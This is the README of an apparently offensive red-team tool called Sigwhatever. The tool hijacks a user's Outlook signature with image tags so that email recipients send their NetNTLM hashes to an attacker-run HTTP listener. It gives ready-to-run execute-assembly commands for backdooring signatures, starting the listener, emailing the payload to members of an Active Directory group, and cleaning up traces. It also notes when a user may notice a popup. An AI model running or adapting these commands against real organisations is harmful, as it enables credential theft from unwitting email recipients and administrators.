Sigwhatever
For automated exploitation of netntlm hash capture via image tags in emails.

==========

**TL DR:**

run:

**execute-assembly sigwhatever.exe AUTO**

Then when you're finished, run:

**execute-assembly sigwhatever.exe CLEANUP**

Bear in mind that even running jobkill on the .net job does not seem to kill the spawned process.

==========


Usage instructions - note that <port> refers to the port that the HTTP server will run on.

        AUTO: Just do everything for me - backdoor the signature and start the listener on this box.

                Usage: sigwhatever.exe AUTO


        CHECKTRUST: Check whether the trust zone settings - if the domain isn't in there then this probably won't work

                Usage: sigwhatever.exe CHECKTRUST


        CHECKFW: Check whether the host based firewall is on and whether there's an exception for the chosen port

                Usage: sigwhatever.exe CHECKFW <port>


        SIGNATURE: hijack the current user's signature, or add a new one via registry changes

                Usage: sigwhatever.exe SIGNATURE <port> <logfile> <backdoorall> <force>


        SIGNOLISTEN: hijack the current user's signature, or add a new one via registry changes

                Usage: sigwhatever.exe SIGNOLISTEN <server> <port> <logfile> <backdoorall>


        CLEANUP: Remove any modifications to the registry or htm signature files

                Usage: sigwhatever.exe CLEANUP


        EMAILADMINS: Enumerate email addresses from an AD group and send them a 'blank' email with the payload.

                Usage: sigwhatever.exe EMAILADMINS <Active Directory group> <port> <logfile> <force>


        LISTENONLY: Just start the listener - make sure it's on the same port

                Usage: sigwhatever.exe LISTENONLY <port> <logfile>


NOTE: With the signature option, if backdoorall is not specified then the tool will attempt to get the current signature from Outlook - this may cause a popup for the user if their AV is out of date.